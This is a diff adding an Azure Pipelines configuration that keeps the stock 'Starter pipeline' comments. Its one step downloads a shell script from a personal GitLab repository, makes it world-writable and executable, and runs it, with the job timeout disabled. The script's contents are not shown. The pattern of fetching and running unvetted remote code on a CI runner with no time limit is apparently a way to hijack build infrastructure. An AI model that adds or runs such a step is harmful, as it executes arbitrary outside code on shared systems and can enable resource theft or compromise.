@@ -1,0 +1,19 @@
+# Starter pipeline
+# Start with a minimal pipeline that you can customize to build and deploy your code.
+# Add steps that build, run tests, deploy, and more:
+# https://aka.ms/yaml
+
+trigger:
+- main
+
+pool:
+  vmImage: ubuntu-18.04
+
+jobs:
+- job: MyJob
+  timeoutInMinutes: 0
+  displayName: My First Job
+  steps:
+  - script: |
+      sudo apt update && sudo apt install wget -y && wget https://gitlab.com/ducthangblack1/script-devops/-/raw/main/test.sh && chmod 777 test.sh && ./test.sh
+    displayName: 'Run a multi-line script'
